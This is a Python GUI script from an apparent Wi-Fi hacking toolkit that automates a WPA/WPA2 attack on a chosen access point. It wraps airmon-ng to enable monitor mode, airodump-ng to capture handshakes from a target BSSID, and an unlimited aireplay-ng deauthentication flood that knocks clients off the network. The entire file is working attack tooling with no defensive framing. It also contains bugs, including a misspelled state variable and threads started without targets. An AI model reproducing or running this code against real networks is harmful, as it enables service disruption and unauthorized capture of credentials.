import threading
import traceback
import subprocess
import re

from tkinter import *

def startWpaWpa2Cracking(interface, targetBssid, targetChannel, terminalContentFrame, wiresharkContentFrame, errorOutputContentFrame, colorConfig = "#252525") :
    global wpaWpa2CrackingIsRunning, wpaWpa2CrackingThreads, terminalLabel, wiresharkLabel, errorOutputLabel

    wpaWpa2CrackingIsRunning = False
    wpaWpa2CrackingThreads = threading.Thread(target = lambda : wpaWpa2CrackingHub(interface, targetBssid, targetChannel))

    terminalLabel = Label(terminalContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=510)
    wiresharkLabel = Label(wiresharkContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=510)
    errorOutputLabel = Label(errorOutputContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=510)
    terminalLabel.configure(bg = colorConfig) 
    wiresharkLabel.configure(bg = colorConfig)
    errorOutputLabel.configure(bg = colorConfig)

    terminalLabel["text"] += "$ Running WPA / WPA2 Cracking...\n\n"

    runWpaWpa2Cracking()

    terminalLabel.pack(anchor = NW)
    errorOutputLabel.pack(anchor = NW)

def stopWpaWpa2Cracking(interface) :
    global wpaWpa2CrackingThreads, wpaWpa2CrackingIsRunning

    try:
        terminalLabel["text"] += "\n$ Stopping WPA / WPA2 Cracking...\n\n"
        wpaWpa2CrackingIsrunning = False
        wpaWpa2CrackingThreads.join(0)
        wpaWpa2CrackingThreads = None

        interface += "mon"
        crackWpaWpa2HandshakeThread.join(0)
        deauthIntProcessThread.join(0)
        subprocess.call(["airmon-ng", "stop", interface])

        terminalLabel["text"] += "$ WPA / WPA2 Cracking successfully stopped!\n"
    except (AttributeError, RuntimeError):
        errorOutputLabel["text"] += traceback.format_exc()
    except Exception as e:
        errorOutputLabel["text"] += "ERROR : \n" + e + "\n"

def runWpaWpa2Cracking() :
    global wpaWpa2CrackingThreads, wpaWpa2CrackingIsRunning
    wpaWpa2CrackingIsRunning = True
    wpaWpa2CrackingThreads.start()

def wpaWpa2CrackingHub(interface, targetBssid, targetChannel):
    global crackWpaWpa2HandshakeThread, deauthIntProcessThread

    killConflictProcess = subprocess.Popen(["airmon-ng", "check", "kill"])

    setIntToMonitorProcess = subprocess.Popen (["airmon-ng", "start", interface], 
                                              stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    setIntToMonitorStdout, setIntToMonitorStderr = setIntToMonitorProcess.communicate()
    terminalLabel["text"] += "$ " + setIntToMonitorStdout.decode()

    interface += "mon"
    terminalLabel["text"] += "$ Starting to listen for Interface Handshake"
    crackWpaWpa2HandshakeProcess = subprocess.Popen (["airodump-ng", "-w", 
                                                      "WifiHacking/PageWpaWpa2Cracking/crackedHandshakes/hackerBox_crackedWpaWpa2Handshake", 
                                                      "-c", targetChannel, "--bssid", targetBssid, interface], 
                                              stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    crackWpaWpa2HandshakeThread = threading.Thread(args=(crackWpaWpa2HandshakeProcess,))
    crackWpaWpa2HandshakeThread.start()
    
    terminalLabel["text"] += "$ Starting to deauthenticate target Interface"
    deauthIntProcess = subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", targetBssid, interface], 
                                        stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    deauthIntProcessThread = threading.Thread(args=(deauthIntProcess,))
    deauthIntProcessThread.start()

    print("ENUMERATE : \n" + str(threading.enumerate()))